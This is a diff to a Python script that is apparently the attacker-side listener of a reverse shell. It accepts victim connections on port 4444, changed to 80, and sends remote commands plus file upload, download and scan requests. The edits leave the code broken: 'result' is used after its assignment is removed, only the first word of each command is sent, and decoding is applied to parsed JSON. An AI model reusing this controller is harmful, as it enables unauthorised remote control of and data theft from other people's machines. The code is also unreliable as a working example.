@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+from email.mime import base
 from os import stat
 import socket
 import json
@@ -17,19 +18,21 @@ class Listener():
         print("[+] Connection Established at [ %s ]" % str(self.address))
 
     def json_send(self, data):
-        json_data = json.dumps(data)
+        print(data)
+        json_data = json.dumps(data).encode()
         self.connection.send(json_data)
-
     def json_recv(self):
-        json_data = ""
+        json_recived = ""
         while True:
             try:
-                json_data += self.connection.recv(1024)
-                return json.loads(json_data)
-            except ValueError:
+                json_recived += self.connection.recv(1024)
+                data = json.loads(json_recived).strip().decode('utf8')
+                return data
+            except ValueError as v:
+                print(v)
                 continue
-
     def execute_remotely(self, command):
+        print(command)
         self.json_send(command)
         if command[0] == "exit":
             self.connection.close()
@@ -56,19 +59,22 @@ class Listener():
 
     def run(self):
         while True:
-            cmd = input("> ")
-            cmd = cmd.split(" ")
+            c = input("> ").strip()
+            cmd = c.split(" ")
+            
             try:
+                
                 if cmd[0] == "upload":
                     file_content = self.upload_file(cmd[1])
                     cmd.append(file_content)
-                result = self.execute_remotely(cmd)
                 if cmd[0] == "download" and "[-] Error " not in result:
                     result = self.download_file(cmd[1], result)
                 if cmd[0] == "scan":
                     result = self.recv_scan_result(result)
-            except Exception:
-                result = "[-] Error during command execution."
+                result = self.execute_remotely(cmd[0])
+            except Exception as e:
+                result = f"[-] Error during command execution.\n\t {e}"
+
             print (result)
 
 def get_status():
@@ -79,17 +85,15 @@ def get_status():
         return True
     return False
 
-while True:
-    try:
-        if get_status:
-            app = Listener("0.0.0.0", 4444)
-            app.run()
-            print(Listener.connection)
-            
-    except Exception as e:
-        print(e)
-        continue
-    except KeyboardInterrupt:
-        print ("Exiting program")
-        sys.exit()
+
+try:
+    if get_status:
+        app = Listener("0.0.0.0", 80)
+        app.run()            
+except Exception as e:
+    print(e)
+    pass
+except KeyboardInterrupt:
+    print ("Exiting program")
+    sys.exit()
 
